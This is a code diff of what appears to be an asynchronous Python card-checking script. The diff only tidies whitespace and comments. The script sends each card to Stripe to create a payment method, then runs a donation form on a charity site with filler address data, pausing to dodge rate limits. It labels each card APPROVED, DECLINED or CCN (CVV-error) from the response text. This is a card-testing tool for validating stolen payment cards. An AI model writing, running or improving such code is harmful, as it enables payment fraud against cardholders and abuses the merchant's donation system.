@@ -1,4 +1,3 @@
-
 import aiohttp
 import asyncio
 import sys
@@ -99,23 +98,23 @@ async def ppc(card):
                 timeout=30,
                 retries=3
             )
-            
+
             if status1 not in [200, 201]:
                 # Return exact Stripe error response
                 return resp1
-                
+
             try:
                 payment_data = json.loads(resp1)
                 pmid = payment_data.get("id")
             except:
                 pmid = parseX(resp1, '"id": "', '"')
-                
+
             if not pmid:
                 return json.dumps({"error": {"message": "Payment method creation failed", "code": "pm_creation_failed"}})
-            
+
             # Add delay to prevent rate limiting
             await asyncio.sleep(1)
-            
+
             # Step 2: Process donation
             status2, resp2 = await make_request(
                 session,
@@ -166,13 +165,13 @@ async def ppc(card):
                     'donation_form[address][country]': 'IN',
                     'donation_form[address][zip]': '10001',
                 },
-                timeout=45,  # Longer timeout for donation processing
+                timeout=45,
                 retries=2
             )
-            
+
             # Return exact donation response
             return resp2
-            
+
     except Exception as e:
         return json.dumps({"error": {"message": f"Processing error: {str(e)}", "code": "processing_error"}})
 
@@ -181,7 +180,6 @@ def parse_result(result):
         # First try to parse as JSON
         try:
             data = json.loads(result)
-            
             if "error" in data:
                 error_msg = data["error"]
                 if isinstance(error_msg, dict):
@@ -190,7 +188,7 @@ def parse_result(result):
                 else:
                     message = str(error_msg)
                     code = "unknown"
-                
+
                 # Only check for CCN if it's specifically CVV/CVC related
                 message_lower = message.lower()
                 if any(pattern.lower() in message_lower for pattern in CCN_patterns):
@@ -198,28 +196,29 @@ def parse_result(result):
                 else:
                     # Return DECLINED with exact message for all other errors
                     return "DECLINED", message
-                    
+
             # Check for success indicators
             if data.get("success") or data.get("status") == "succeeded":
                 return "APPROVED", "Payment successful"
-                
+
             # If no error but also no clear success, return the raw response
             return "DECLINED", str(data)
-            
+
         except json.JSONDecodeError:
             # If not JSON, treat as plain text and return as is
             result_lower = result.lower()
-            
+
             # Only check for CCN if specifically CVV related
             if any(pattern.lower() in result_lower for pattern in CCN_patterns):
                 return "CCN", result
+
             # Check for success patterns
             elif any(word in result_lower for word in ["success", "approved", "completed", "thank you"]):
                 return "APPROVED", result
             else:
                 # Return as DECLINED with exact message
                 return "DECLINED", result
-                
+
     except Exception as e:
         return "ERROR", f"Parse error: {str(e)}"
 
